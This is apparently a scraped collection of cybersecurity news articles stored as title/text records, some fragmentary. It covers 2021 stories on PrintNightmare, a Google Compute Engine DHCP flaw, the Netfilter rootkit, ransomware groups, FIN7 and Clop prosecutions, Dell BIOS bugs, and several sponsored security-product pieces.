injects“ so as to enable Gozi to surreptitiously gather information entered by users on banking websites, landed a 21-month prison term in January 2016 for his co-conspiratorial role in the fraudulent scheme.\nDespite these law enforcement efforts, Gozi, however, continues to be an ever-evolving malware that has since morphed from a simple banking trojan into a modular malicious content delivery platform, with cybersecurity firm Check Point uncovering “modern derivatives“ that were actively deployed in several cyber attacks as of August 2020.\n\n\nFound this article interesting?

{'title': '[Webinar] How Cyber Attack Groups Are Spinning a Larger Ransomware Web',
'text': 'Organizations today already have an overwhelming number of dangers and threats to look out for, from spam to phishing attempts to new infiltration and ransomware tactics. There is no chance to rest, since attack groups are constantly looking for more effective means of infiltrating and infecting systems.\nToday, there are hundreds of groups devoted to infiltrating almost every industry, constantly devising more sophisticated methods to attack organizations.\nIt’s even more troubling to note that some groups have started to collaborate, creating complex and stealthy tactics that leave even the best security teams scrambling to respond. Such is the case noted by XDR Provider Cynet, as the company observes in its newest Research Webinar (register here).\nCynet’s research team noted that two of the most infamous attack groups – Lunar Spider and Wizard Spider – have started working together to infect organizations with ransomware.\nThe development is certainly troubling, and the report shows why security teams and professionals must constantly be looking at the whole picture, not just the result of an attack. \nCombining attacks for greater impact \nCynet’s researchers first noticed something was amiss as they were studying IcedID malware, developed by Lunar Spider. Originally observed in the wild in 2017, IcedID is a banking Trojan that has targeted the financial sectors in both the US and Europe. After it was initially revealed, Lunar Spider shifted IcedID’s modus operandi to enable it to deploy additional payloads, such as Cobalt Strike. \nThe researchers also studied the CONTI ransomware, a relatively new attack approach developed by Wizard Spider that’s already in the FBI’s crosshairs. This “ransomware-as-a-service“ (RaaS) has been spotted in the US and Europe and has already wreaked havoc on many organizations and networks. \nCynet first suspected the connection between the two organizations as it was exploring a case of CONTI ransomware that used many familiar tactics, though not ones traditionally deployed by the Wizard Spider group. \nDuring the investigation, the team discovered that CONTI was being deployed through malware campaigns that used IcedID as an initial point of attack. After establishing persistence on targets’ devices, IcedID deployed a CONTI ransomware variant to lock the network. \nUnderstanding the risks \nThe new Cynet Research Webinar will dive deeper into the anatomy of this collaboration to explain why it’s so troubling, but also how it can be detected and combatted. The webinar will discuss: \nThe background of the attack groups. Both Lunar Spider and Wizard Spider are well known and highly dangerous. Their existing malware and other tools are widely popular and present in many notable breaches and attacks. Before exploring their tools, the webinar will break down each group. The increasing popularity of ransomware attacks. These tactics have become widespread and are expected to cost organizations hundreds of billions of dollars in the next decade. To truly comprehend how to combat this new attack tactic, it’s worth establishing how ransomware works, and some common tactics. The anatomy of a combined IcedID and CONTI attack. The webinar will break down a case study of this new attack tactic. Unlike some other ransomware attacks, this new method uses techniques from both to create persistence, avoid detection, and lock systems before organizations can react. Moreover, they’re increasingly using “double extortion“ methods, which both lock data and threaten leaks if payment isn’t received. \nYou can register to the webinar here. \n\n\nFound this article interesting?

{'title': 'Researchers Leak PoC Exploit for a Critical Windows RCE Vulnerability',
'text': 'A proof-of-concept (PoC) exploit related to a remote code execution vulnerability affecting Windows Print Spooler and patched by Microsoft earlier this month was briefly published online before being taken down.\nIdentified as CVE-2021-1675, the security issue could grant remote attackers full control of vulnerable systems. Print Spooler manages the printing process in Windows, including loading the appropriate printer drivers and scheduling the print job for printing, among others.\nPrint Spooler flaws are concerning, not least because of the wide attack surface, but also owing to the fact that it runs at the highest privilege level and is capable of dynamically loading third-party binaries.\n\nThe Windows maker addressed the vulnerability as part of its Patch Tuesday update on June 8, 2021. But almost two weeks later, Microsoft revised the flaw’s impact from an elevation of privilege to remote code execution (RCE) as well as upgraded the severity level from Important to Critical.\n“Either the attacker exploits the vulnerability by accessing the target system locally (e.g., keyboard, console), or remotely (e.g., SSH); or the attacker relies on User Interaction by another person to perform actions required to exploit the vulnerability (e.g., tricking a legitimate user into opening a malicious document),“ Microsoft said in its advisory.\nThings took a turn when Chinese security firm QiAnXin earlier this week disclosed it was able to find the “right approaches“ to leverage the flaw, thereby demonstrating a successful exploitation to achieve RCE.\nAlthough the researchers refrained from sharing additional technical specifics, Hong Kong-based cybersecurity company Sangfor published what’s an independent deep-dive of the same vulnerability to GitHub, along with a fully working PoC code, where it remained publicly accessible before it was taken offline a few hours later.\nSangfor codenamed the vulnerability “PrintNightmare.“\n\n“We deleted the PoC of PrintNightmare. To mitigate this vulnerability, please update Windows to the latest version, or disable the Spooler service,“ tweeted Sangfor’s Principal Security Researcher Zhiniang Peng. The findings are expected to be presented at the Black Hat USA conference next month.\nWindows Print Spooler has long been a source of security vulnerabilities, with Microsoft fixing at least three issues — CVE-2020-1048, CVE-2020-1300, and CVE-2020-1337 — in the past year alone. Notably, a flaw in the service was also abused to gain remote access and propagate the Stuxnet worm in 2010 targeting Iranian nuclear installations.\nUpdate — There are now indications that the fix released by Microsoft for the critical remote code execution vulnerability in the Windows Print spooler service in June does not completely remediate the root cause of the bug, according to the CERT Coordination Center, raising the possibility that it’s a zero-day flaw in need of a patch.\n“While Microsoft has released an update for CVE-2021-1675, it is important to realize that this update does not address the public exploits that also identify as CVE-2021-1675,“ CERT/CC’s Will Dormann said in a vulnerability note published Wednesday.\nIt’s worth noting that the successful exploitation of CVE-2021-1675 could open the door to complete system takeover by remote adversaries.

'text': 'GitHub on Tuesday launched a technical preview of a new AI-powered pair programming tool that aims to help software developers write better code across a variety of programming languages, including Python, JavaScript, TypeScript, Ruby, and Go.\nCopilot, as the code synthesizer is called, has been developed in collaboration with OpenAI, and leverages Codex, a new AI system that’s trained on publicly available source code and natural language with the goal of translating comments and code written by a user into auto-generated code snippets.\n\n“GitHub Copilot draws context from the code you’re working on, suggesting whole lines or entire functions,“ GitHub CEO Nat Friedman said in a blog post. “It helps you quickly discover alternative ways to solve problems, write tests, and explore new APIs without having to tediously tailor a search for answers on the internet.“\n\nDespite its function as an AI-based autocomplete for writing boilerplate code, the Microsoft-owned software repository hosting and version control platform reiterated that Copilot is not designed to write code on behalf of the developer, while noting that users can cycle through alternative suggestions and manually edit suggested code.\nGiven that the code suggestions are based on a selection of English language and source code from publicly available repositories on GitHub, the company also made it a point to explicitly spell out the security consequences that may arise out of relying on low-quality code from the training set, leading to “insecure coding patterns, bugs, or references to outdated APIs or idioms.“\nIn other words, the code suggested by GitHub Copilot “should be carefully tested, reviewed, and vetted, like any other code.“\n\nHowever, if it’s any consolation, the code autofilled by Copilot is largely unique, with a test performed by GitHub finding that only 0.1% of generated code could be found verbatim in the training set. The company also said it has filters in place to block offensive words and avoid generating suggestions in sensitive contexts.\nGitHub Copilot is currently available as an extension for Microsoft’s cross-platform code editor Visual Studio Code, both locally on the machine or in the cloud on GitHub Codespaces.\n\n\nFound this article interesting?

{'title': 'Unpatched Virtual Machine Takeover Bug Affects Google Compute Engine',
'text': 'An unpatched security vulnerability affecting Google’s Compute Engine platform could be abused by an attacker to take over virtual machines over the network.\n“This is done by impersonating the metadata server from the targeted virtual machine’s point of view,“ security researcher Imre Rad said in an analysis published Friday. “By mounting this exploit, the attacker can grant access to themselves over SSH (public key authentication) so then they can login as the root user.“\nGoogle Compute Engine (GCE) is an infrastructure-as-a-service (IaaS) component of Google Cloud Platform that enables users to create and launch virtual machines (VMs) on demand. GCE provides a method for storing and retrieving metadata in the form of the metadata server, which offers a central point to set metadata in the form of key-value pairs that’s then provided to virtual machines at runtime.\n\nAccording to the researcher, the issue is a consequence of weak pseudo-random numbers used by the ISC DHCP client, resulting in a scenario wherein an adversary crafts multiple DHCP packets using a set of precalculated transaction identifiers (aka XIDs) and floods the victim’s DHCP client, ultimately leading to the impersonation of the metadata server.\nDynamic Host Configuration Protocol (DHCP) is a network management protocol used to automate the process of configuring devices on IP networks. A DHCP server dynamically assigns an IP address and other network configuration parameters to each client device on a network so that they can communicate with other networks.\nBy hitting the victim VM with a stream of DHCP packets, the idea is to leverage the “predictable“ XID and make the client accept an attacker-sent packet over Google’s DHCP server packets, at which point the network stack on the victim VM can configured to use the rogue metadata server.\n\n“If the XID is correct, the victim machine applies the network configuration,“ Rad explained in the technical write-up. “This is a race condition, but since the flood is fast and exhaustive, the metadata server has no real chance to win. At this point the attacker is in the position of reconfiguring the network stack of the victim.“\nGiven that a metadata server can be used to distribute and manage SSH keys, a client — now having established a TCP connection to the rogue server — can retrieve the attacker’s SSH public key, which can then be used by the attacker to open a remote shell as the root user.\nIn a potential real-world scenario, the aforementioned attack chain can be abused by an adversary to gain full access to a targeted virtual machine as it’s being rebooted or over the internet in cases when the cloud platform’s firewall is turned off.\n\nGoogle was informed about the issue on Sept. 27, 2020, which has since acknowledged the report, describing it as a “nice catch,“ but has yet to roll out a patch, or provide a timeline for when the correction will be made available.\n“Until the fix arrives, don’t use DHCP or setup a host level firewall rule to ensure the DHCP communication comes from the metadata server (169.254.169.254),“ Rad noted. “Block UDP/68 between VMs, so that only the metadata server could carry out DHCP.“\nThis is far from the first time Rad has identified issues in the Google Cloud Platform. \nIn September 2020, Google rectified a local privilege escalation vulnerability in the OS Config tool that could be exploited by an actor with code execution rights on the affected GCE VMs to perform unauthorized operations.\nThen earlier this January, Rad also found that it was possible to achieve arbitrary code execution in a virtual machine by obtaining a shell on the Cloud SQL database service. The issue was addressed by Google on Feb. 16, 2021.\n\n\nFound this article interesting? Follow THN on Facebook, Twitter  and LinkedIn to read more exclusive content we post.',

{'title': 'New API Lets App Developers Authenticate Users via SIM Cards',
'text': 'Online account creation poses a challenge for engineers and system architects: if you put up too many barriers, you risk turning away genuine users. Make it too easy, and you risk fraud or fake accounts.\nThe Problem with Identity Verification\nThe traditional model of online identity – username/email and password – has long outlived its usefulness. This is how multi-factor or two-factor authentication (MFA or 2FA) has come into play, to patch up vulnerabilities of the so-called knowledge-based model, usually by SMS passcode to verify possession of a mobile phone number.\nThe simplicity of SMS-based verification has taken apps by storm – it’s the default option, as most users have a mobile phone. Yet bad actors have learned how to exploit this verification method, leading to the menace of SIM swap fraud, which is alarmingly easy to pull off and rising rapidly in incidents.\nThere’s been no lack of effort in finding a more secure factor that is still universal. For example, biometrics are powerful, but not every user has a smartphone that can take a fingerprint or face ID. Authenticator apps are a strong alternative, but they’re complex and not suitable for casual users. Similarly, hardware tokens are very secure, but only for the very tech-minded: it’s not realistic for the average consumer to buy and carry one. \nIntroducing SIM-based Verification\nSometimes the simplest solution is already in our hands. SMS alone may not be secure, but mobile phone numbers tethered to a SIM card are: they’re a unique pairing that is difficult to tamper with or copy.\nSIM-based authentication is an identity breakthrough. It is now possible to prevent fraud and fake accounts while seamlessly verifying mobile users using the most cryptographically secure identifier they already have – the SIM card embedded in their mobile devices.\nThe Latest Method to Prevent Account Takeovers and SIM Swap Fraud\nIf you’re concerned about SIM swap fraud as a threat to your users, you’d be right. SIM swap fraud is a growing issue with serious financial consequences – FinTechs and cryptocurrency wallets have been especially targeted, but any platform that uses SMS to verify identity is at risk. All it takes is one compromised user to cause major support issues and brand damage.\nSIM-based authentication provides a simple fix, with an immediate, actionable response. Fraudsters attempt to access their victims’ accounts usually within 24 hours, so by checking for SIM swap activity within the last 7 days, SubscriberCheck by tru.ID can detect them at the gate. \nIf there has been a change of SIM card, that change will be flagged, and you can implement step-up security user journeys or prevent access altogether.\nHow the SIM-Authentication API Works\nThe SIM card within the phone is already authenticated with the Mobile Network Operator (MNO). SIM authentication allows mobile customers to make and receive phone calls and connect to the Internet.\nSubscriberCheck from tru.ID hooks into the same authentication mechanism as MNOs. As a result, the tru.ID API does two things. Firstly, it verifies that the mobile number is active and paired to the SIM card on the mobile phone. As part of this verification, the API also retrieves information if the SIM card associated with the phone number has recently changed. These checks can be integrated easily with APIs and SDKs. \nPowerful and private: Here is How to use SubscriberCheck\n1 — Test the tru.ID API with a phone number you’d like to verify and check SIM status on.\n2 — The tru.ID platform performs a lookup on the phone number to determine which MNO it is associated with.\n3 — tru.ID then asks that MNO for a unique Check URL that will be used as part of a mobile authentication workflow.\n4 — The tru.ID platform stores that MNO Check URL and returns a tru.ID Check URL.\n\n5 — Request the tru.ID Check URL within the mobile application using the tru.ID SDK for Android, 6, iOS, or React Native. It’s important to use the SDK because it forces the web request over the authenticated mobile data session.\n\n6 — The MNO will receive the web request via a redirect from the tru.ID platform. The MNO then determines if the phone number associated with the authenticated mobile data session matches the phone number associated with the requested Check URL. If it does, then the phone number has been successfully verified.\n7 — At this point the tru.ID platform also performs a SIM card change lookup and stores the result.\n8 — Once the Check URL request has completed and the SIM change information retrieved, the mobile application can request the result of the phone verification from the tru.ID API. \n\n9 — Use the phone verification match and SIM card change `no_sim_change` properties within your application logic.\n\nHow to Get Started\nOf course, seeing is believing. You can start testing now for free and make your first API call within minutes – just sign up with tru.ID and check the documentation for your guide to getting started.\n\n\nFound this article interesting?

'text': 'Microsoft on Friday said it’s investigating an incident wherein a driver signed by the company turned out to be a malicious Windows rootkit that was observed communicating with command-and-control (C2) servers located in China.\nThe driver, called “Netfilter,“ is said to target gaming environments, specifically in the East Asian country, with the Redmond-based firm noting that “the actor’s goal is to use the driver to spoof their geo-location to cheat the system and play from anywhere.“\n\n“The malware enables them to gain an advantage in games and possibly exploit other players by compromising their accounts through common tools like keyloggers,“ Microsoft Security Response Center (MSRC) said.\nIt’s worth pointing out that Netfilter also refers to a legitimate software package, which enables packet filtering and network address translation for Linux based systems.\nMicrosoft dubbed the malware “Retliften,“ alluding to “netfilter“ but spelled backwards, adding the malicious driver can intercept network traffic, add new root certificates, set a new proxy server, and modify internet settings without a user’s consent.\nThe rogue code signing was spotted by Karsten Hahn, a malware analyst at German cybersecurity company G Data, who shared additional details of the rootkit, including a dropper, which is used to deploy and install Netfilter on the system.\n\nUpon successful installation, the driver was found to establish connection with a C2 server to retrieve configuration information, which offered a number of functionalities such as IP redirection, among other capabilities to receive a root certificate and even self-update the malware.\n\nThe oldest sample of Netfilter detected on VirusTotal dates back to March 17, 2021, Hahn said.\n\nMicrosoft noted that the actor submitted the driver for certification through the Windows Hardware Compatibility Program (WHCP), and that the drivers were built by a third-party. The company has since suspended the account and reviewed its submissions for additional signs of malware.\nThe Windows maker also stressed that the techniques employed in the attack occur post-exploitation, which necessitates that the adversary must have had previously gained administrative privileges so as to be able to install the driver during system startup or trick the user into doing it on their behalf.\nAdditionally, Microsoft said it intends to refine its partner access policies as well as its validation and signing process to enhance protections further.\n“The security landscape continues to rapidly evolve as threat actors find new and innovative methods to gain access to environments across a wide range of vectors,“ MSRC said, once again highlighting how the trust associated with signed drivers can be exploited by threat actors to facilitate large-scale software supply chain attacks.\n\n\nFound this article interesting?

{'title': 'DMARC: The First Line of Defense Against Ransomware',
'text': 'There has been a lot of buzz in the industry about ransomware lately. Almost every other day, it’s making headlines. With businesses across the globe holding their breath, scared they might fall victim to the next major ransomware attack, it is now time to take action.\nThe FBI IC3 report of 2020 classified Ransomware as the most financially damaging cybercrime of the year, with no major improvement in 2021.\nWouldn’t it be nice if you could prevent a ransomware attack from occurring in the first place? DMARC can make this seemingly impossible claim a possibility for domain owners! \nMultiple benefits arise from your DMARC implementation over time, including an increase in the deliverability of your email as well as a higher domain reputation. DMARC is also known as the first line of defense against Ransomware.\nLet’s take a closer look.\nWhat are the Risks Associated with Ransomware? \nRansomware is malicious software that installs itself on your computer without your permission. It then encrypts your data, and you can only get it back by paying a fee.\nOnce a ransomware program has gained access to your system, it can cause a great deal of havoc, and the ransom demands are expensive to resolve. It is disastrous for a business that relies on access to critical data stored on its computers.\nLack of DMARC protection in organizations can lead to the following: \nWhen email authentication protocols are not in place, cybercriminals can easily pretend to be you and send fake emails to your clients, partners, and even internal employees.Fraudulent email messages may contain attachments or files containing ransomware. If any of your employees open the message, your entire organization is put at risk of having sensitive information present on your organizational systems denied access, with your data being held hostage for huge amounts of money. Furthermore, if the phishing email contains ransomware and is delivered to and opened by your clients and partners who see it as coming from you, it will damage your company’s reputation.The threat of ransomware attacks perpetrated by using fake email messages results from the use of spoofing tactics on your domain, and either way can potentially result in your business going under, your customers losing trust, and loss of data and financial assets. The payment of a ransom is not a guarantee that you will regain access to your data since attackers often do not decrypt information once it has been encrypted, even after receiving payment. When you implement DMARC at your organization, you ensure that the email receivers only receive emails that are sent from legitimate sources and are authorized by you. DMARC allows you to instruct your email receiving servers to block messages that appear suspicious or are sent from unapproved sources. In this way, the risk of malware being delivered via fake emails is greatly reduced. \nTo find out how safe your domain is against email spam and spoofing, use this DMARC Domain Checker. You might be shocked by the results!\nThe Cybersecurity and Infrastructure Security Agency (CISA) recommends DMARC for Ransomware Protection\nAs a result of the increase in Ransomware attacks on global businesses, the CISA has deemed email phishing to be one of the most potent vectors of the threat.\nCybersecurity Infrastructure Security Agency of the US government has recommended, in their Ransomware Protection Guide, that all businesses, including government agencies, implement DMARC as early as possible to reduce the likelihood of spoofed or modified emails from valid domains. The reason for this is that DMARC builds on email authentication standards like SPF and DKIM, which authenticate sending sources, and ensure that your recipients are never deceived. \nImplementing a DMARC analyzer in your organization ensures you are protected from impersonation to the fullest extent possible. This tool makes it easy to configure DMARC for your domain and switch to an enforced policy within days. \nThis ultimately leads to: \nLowers the chances of your domain being spoofed by attackers Prevents the delivery of fake emails to your receivers and improves trust with your partnersDrastically reduces the success rate of ransomware attacks on your customersBoosts email deliverability and domain reputationProvides you an early indicator of any attacks that are launched against your brand\nMonitoring Your Domain is a Must to Prevent Future Attacks \n\nWhile DMARC can help you mitigate Ransomware attacks by preventing your domain name from being spoofed, it is important to realize that attackers are constantly adapting their tactics and upgrading their software. The sophistication of social engineering attacks is increasing over time, making them more difficult to detect and prevent. \nThis is why monitoring your domains at your organization is so vital to maintaining an effective email security posture. DMARC reports allow you to do just that.\nA DMARC Report Analyzer helps you: \nMonitor your domains across an interactive and organized dashboardView your DMARC reports in a simplified, human-readable format It handles your DMARC data on your behalfParses complex XML files into easily readable tables and charts, and helps you view your authentication results in real-timeConverts your DMARC reports into PDF documents that you can easily share with your employeesView granular details on email sending sources such as their underlying IP addresses, organizational domains, history of domain abuse, and geolocations of your senders. This data allows you to track malicious sources faster and take action against them.\nOverall, it serves to prevent fraud from happening in the future. Since humans are prone to making mistakes, urging your customers and employees not to click on malicious links is pointless. Taking matters into your own hands is what you should do instead.

It’s tracked by the wider cybersecurity community under the monikers APT29, UNC2452 (FireEye), SolarStorm (Unit 42), StellarParticle (Crowdstrike), Dark Halo (Volexity), and Iron Ritual (Secureworks).\nIn addition, Microsoft said it detected information-stealing malware on a machine belonging to one of its customer support agents, who had access to basic account information for a small number of its customers. \nThe stolen customer information was subsequently used “in some cases“ to launch highly-targeted attacks as part of a broader campaign, the company noted, adding it moved quickly to secure the device. Investigation into the incident is still ongoing.\n\nThe revelation that the hackers have set up a new arm of the campaign comes a month after Nobelium targeted more than 150 different organizations located across 24 countries by leveraging a compromised USAID account at a mass email marketing company called Constant Contact to send phishing emails that enabled the group to deploy backdoors capable of stealing valuable information.\nThe development also marks the second time the threat actor singled out Microsoft after the company disclosed earlier this February the attackers had managed to compromise its network to view source code related to its products and services, including Azure, Intune, and Exchange.\nWhat’s more, the disclosure arrives as the U.S. Securities and Exchange Commission (SEC) opened a probe into the SolarWinds breach to examine whether some victims of the hack had failed to publicly disclose the security event, Reuters reported last week.\n\n\nFound this article interesting?

'text': 'Google’s sweeping proposal to deprecate third-party cookies in Chrome browser is going back to the drawing board after the company announced plans to delay the rollout from early 2022 to late 2023, pushing back the project by nearly two years.\n“While there’s considerable progress with this initiative, it’s become clear that more time is needed across the ecosystem to get this right,“ Chrome’s Privacy Engineering Director, Vinay Goel, said Thursday.\nIn buying extra time, the search giant said it hopes to arrive at a consensus on the right solutions, while simultaneously engaging with regulators, and enabling publishers and the advertising industry to migrate their services to privacy-preserving technologies that prevent “alternative forms of individual tracking, and discourage the rise of covert approaches like fingerprinting.“\n\nThe revised timelines comes close on the heels of a fresh regulatory setback in the European Union, after the European Commission opened a wide-ranging investigation into Google’s digital advertising business to examine its “plans to prohibit the placement of third party ’cookies’ on Chrome and replace them with the ’Privacy Sandbox’ set of tools,“ and assess its “effects on online display advertising and online display advertising intermediation markets.“\nIn a similar move, the U.K.’s Competition and Markets Authority (CMA) separately earlier this month announced that it’s taking up a “role in the design and development of Google’s Privacy Sandbox proposals to ensure they do not distort competition.“\nThird-party tracking cookies have emerged as a point of privacy concern as the technology enables marketers and ad platforms to monitor user activity online as they hop from one website to the other for purposes of behavioral targeting. Apple’s Safari and Mozilla’s Firefox already block them by default.\nAnnounced in January 2020, Google’s Privacy Sandbox aims to retire support for third-party cookies in Chrome with an alternative tool called Federated Learning of Cohorts (aka FLoC) that combines aggregation, anonymization, on-device processing, and other privacy-preserving technologies to classify users into cohorts based on their interests, which can then be used by the ad tech industry to tailor ads.\nBut the company’s ad tech overhaul has run into a number of potential concerns, with Mozilla noting that “the current design has a number of privacy properties that could create significant risks if it were to be widely deployed in its current form.“ The Electronic Frontier Foundation (EFF) called it a “terrible idea“ that creates new privacy risks.\n\nAdding to Google’s woes, no other browser maker has committed to using FLoC, including those that are based on the open-source Chromium codebase such as Brave, Microsoft Edge, Opera, and Vivaldi. What’s more, an analysis from Digiday this month found that Amazon is actively blocking the cookieless tracking system from “gathering valuable data reflecting the products people research“ across its namesake website, WholeFoods, Zappos, ShopBop, and Goodreads.\nIf anything, Google is in an unenviable position of having to balance demands for stronger user-privacy protections vis-à-vis its dominant role in multiple businesses — search, ad tech, and web browser — in the process, pitting these conflicting incentives against one other, and drawing the ire of privacy advocates, regulators, publishers, and advertisers alike.\n“We believe that the Privacy Sandbox will provide the best privacy protections for everyone. By ensuring that the ecosystem can support their businesses without tracking individuals across the web, we can all ensure that free access to content continues,“ Goel said.\n“And because of the importance of this mission, we must take time to evaluate the new technologies, gather feedback and iterate to ensure they meet our goals for both privacy and performance, and give all developers time to follow the best path for privacy,“ he added.\n\n\nFound this article interesting?

'text': 'A previously undocumented Windows malware has infected over 222,000 systems worldwide since at least June 2018, yielding its developer no less than 9,000 Moneros ($2 million) in illegal profits.\nDubbed “Crackonosh,“ the malware is distributed via illegal, cracked copies of popular software, only to disable antivirus programs installed in the machine and install a coin miner package called XMRig for stealthily exploiting the infected host’s resources to mine Monero.\nAt least 30 different versions of the malware executable have been discovered between Jan. 1, 2018, and Nov. 23, 2020, Czech cybersecurity software company Avast said on Thursday, with a majority of the victims located in the U.S., Brazil, India, Poland, and the Philippines.\n\nCrackonosh works by replacing critical Windows system files such as “serviceinstaller.msi“ and “maintenance.vbs“ to cover its tracks and abuses the safe mode, which prevents antivirus software from working, to delete Windows Defender (and other installed solutions) and turn off automatic updates. \n\nAs part of its anti-detection and anti-forensics tactics, the malware also installs its own version of “MSASCuiL.exe“ (i.e., Windows Defender), which puts the icon of Windows Security with a green tick to the system tray and runs tests to determine if it’s running in a virtual machine.\nLast December, security researcher Roberto Franceschetti disclosed that antivirus applications could be disabled by booting into safe mode and renaming their application directories before their corresponding services are launched in Windows. \n\nMicrosoft, however, said the issue doesn’t “meet the bar for security servicing,“ noting that the attack is predicated on having administrative/root privileges, adding a “malicious administrator can do much worse things.“\n\nThe development also comes as suspected Chinese threat actors behind DirtyMoe and Purple Fox malware were found to have compromised about 100,000 Windows machines as part of an evolving cryptojacking campaign dating all the way back to 2017.\n“Crackonosh shows the risks in downloading cracked software,“ Avast security researcher Daniel Beneš said. “As long as people continue to download cracked software, attacks like these will continue and continue to be profitable for attackers. The key take-away from this is that you really can’t get something for nothing and when you try to steal software, odds are someone is trying to steal from you.“\n\n\nFound this article interesting?

'text': 'A Ukrainian national and a mid-level supervisor of the hacking group known as FIN7 has been sentenced to seven years in prison for his role as a “pen tester“ and perpetuating a criminal scheme that enabled the gang to compromise millions of customers debit and credit cards.\nAndrii Kolpakov, 33, was arrested in Spain on June 28, 2018, and subsequently extradited to the U.S. the following year on June 1, 2019. In June 2020, Kolpakov pleaded guilty to one count of conspiracy to commit wire fraud and one count of conspiracy to commit computer hacking.\n\nThe Western District of Washington also ordered Kolpakov to pay $2.5 million in restitution.\nThe defendant, who was involved with the group from April 2016 until his arrest, managed other hackers who were tasked with breaching the point-of-sale systems of companies, both in the U.S. and elsewhere, to deploy malware capable of stealing financial information.\nFIN7, also called Anunak, Carbanak Group, and the Navigator Group, is said to have engaged in a sophisticated malware campaign at least since 2015 targeting restaurant, gambling, and hospitality industries in the U.S. to plunder credit and debit card numbers that were then used or sold for profit on underground forums.\n\nAccording to court documents, FIN7 used a firm called Combi Security as a front to recruit hackers — one of them being Kolpakov — to “provide a veil of legitimacy to the illegal enterprise,“ while projecting itself as “one of the leading international companies“ that offered penetration testing services to customers worldwide.\n“FIN7 carefully crafted email messages that would appear legitimate to a business’s employees and accompanied emails with telephone calls intended to further legitimize the emails,“ the Department of Justice (DoJ) said in a release. “Once an attached file was opened and activated, FIN7 would use an adapted version of the Carbanak malware, in addition to an arsenal of other tools, to access and steal payment card data for the business’s customers.“\n\nThe total damages stemming from these intrusions exceeded $1 billion, the DoJ said.\nKolpakov is the second member of the FIN7 group to be sentenced in the U.S. since the start of the year. In April, another 35-year-old Ukrainian national Fedir Hladyr was awarded 10 years in prison for his role as a high-level manager and systems administrator responsible for maintaining the server infrastructure that FIN7 used to attack and control victims’ machines.\nThis is not the first time FIN7 has disguised itself as a legitimate cybersecurity company to distribute malware.\nLast month, researchers from BI.ZONE cyber threats research team found that the collective distributed a toolkit called Lizar (aka Tirion) as a penetration testing software for Windows networks with the aim of conducting reconnaissance and getting a foothold inside infected systems. “These groups hire employees who are not even aware that they are working with real malware or that their employer is a real criminal group,“ the researchers noted.\n\n\nFound this article interesting?

'text': 'The cybercrime ring that was apprehended last week in connection with Clop (aka Cl0p) ransomware attacks against dozens of companies in the last few months helped launder money totaling $500 million for several malicious actors through a plethora of illegal activities.\n“The group — also known as FANCYCAT — has been running multiple criminal activities: distributing cyber attacks; operating a high-risk exchanger; and laundering money from dark web operations and high-profile cyber attacks such as Cl0p and Petya ransomware,“ popular cryptocurrency exchange Binance said Thursday.\n\nOn June 16, the Ukraine Cyber Police nabbed six individuals in the city of Kyiv, describing the arrests as resulting from an international operation involving law enforcement authorities from Korea, the U.S., and Interpol.\nWhile the bust was seen as a major blow to the operations of the Clop gang, the hackers published earlier this week a fresh batch of confidential employee records stolen from a previously unknown victim on their dark web portal, raising the possibility that the arrested suspects may have been affiliates who play a lesser role in the operations.\n\nBinance’s insights into the investigation have now revealed that FANCYCAT was responsible for cashing out and laundering cryptocurrency illicitly obtained by the Clop ransomware cartel by breaching and extorting victims, confirming earlier reports from Intel 471.\nClop is one of several ransomware groups that hack into organizations, launch ransomware that encrypts files and servers, and then demand an extortion payment in return for a digital key needed to unlock access to the systems.\n“In a majority of the cases associated with illicit blockchain flows coming onto exchanges, the exchange is not harboring the actual criminal group themselves, but rather being used as a middleman to launder stolen profits,“ security researchers from Binance said, adding the criminals take advantage of the exchanges’ liquidity, diverse digital asset offerings, and well-developed APIs to facilitate cyber attacks.\n\nTo counter such nefarious activity from happening, the company said it’s implementing custom detection mechanisms to identify and offboard suspicious accounts, adding it’s working directly with law enforcement to take down cybercrime groups.\nThe development comes during a period of intense scrutiny of the risks posed by ransomware, which has ballooned from a lucrative financial crime to a national security threat, grounding critical infrastructure to a halt and causing severe disruptions, necessitating that bitcoin trails be tracked to “follow the money“ and fight the spiraling problem.\n\n\n\n\nFound this article interesting?

{'title': 'BIOS Disconnect: New High-Severity Bugs Affect 128 Dell PC and Tablet Models',
'text': 'Cybersecurity researchers on Thursday disclosed a chain of vulnerabilities affecting the BIOSConnect feature within Dell Client BIOS that could be abused by a privileged network adversary to gain arbitrary code execution at the BIOS/UEFI level of the affected device.\n“As the attacker has the ability to remotely execute code in the pre-boot environment, this can be used to subvert the operating system and undermine fundamental trust in the device,“ researchers from enterprise device security firm Eclypsium said. “The virtually unlimited control over a device that this attack can provide makes the fruit of the labor well worth it for the attacker.“\n\nIn all, the flaws affect 128 Dell models spanning across consumer and business laptops, desktops, and tablets, totalling an estimated 30 million individual devices. Worse, the weaknesses also impact computers that have Secure Boot enabled, a security feature designed to prevent rootkits from being installed at boot time in memory.\nBIOSConnect offers network-based boot recovery, allowing the BIOS to connect to Dell’s backend servers via HTTPS to download an operating system image, thereby enabling users to recover their systems when the local disk image is corrupted, replaced, or absent.\nSuccessful exploitation of the flaws could mean loss of device integrity, what with the attacker capable of remotely executing malicious code in the pre-boot environment that could alter the initial state of the operating system and break OS-level security protections.\nThe four flaws have a cumulative severity rating of 8.3 when chained together —\nCVE-2021-21571 (CVSS score: 5.9) - Dell UEFI BIOS HTTPS stack leveraged by the Dell BIOSConnect feature and Dell HTTPS Boot feature contains an improper certificate validation vulnerability. An unauthenticated remote attacker may exploit this vulnerability using a person-in-the-middle attack which may lead to a denial of service and payload tampering.CVE-2021-21572, CVE-2021-21573, and CVE-2021-21574 (CVSS score: 7.2) - Dell BIOSConnect feature contains a buffer overflow vulnerability. An authenticated malicious admin user with local access to the system may potentially exploit this vulnerability to run arbitrary code and bypass UEFI restrictions.\nThe combination of remote exploitation as well the ability to gain control over the most privileged code on the device could make such vulnerabilities a lucrative target for attackers, the researchers said.\n\nThe issues were reported to Dell by the Oregon-based company on March 3, following which server-side updates were rolled out on May 28 to remediate CVE-2021-21573 and CVE-2021-21574. Dell has also released client-side BIOS firmware updates to address the remaining two flaws.\nAdditionally, the PC maker has released workarounds to disable both the BIOSConnect and HTTPS Boot features for customers who are unable to apply the patches immediately.\n“Successfully compromising the BIOS of a device would give an attacker a high degree of control over a device,“ Eclypsium researchers said. “The attacker could control the process of loading the host operating system and disable protections in order to remain undetected. This would allow an attacker to establish ongoing persistence while controlling the highest privileges on the device.“\n\n\nFound this article interesting?

{'title': 'Reduce Business Risk By Fixing 3 Critical Endpoint-to-Cloud Security Requirements',
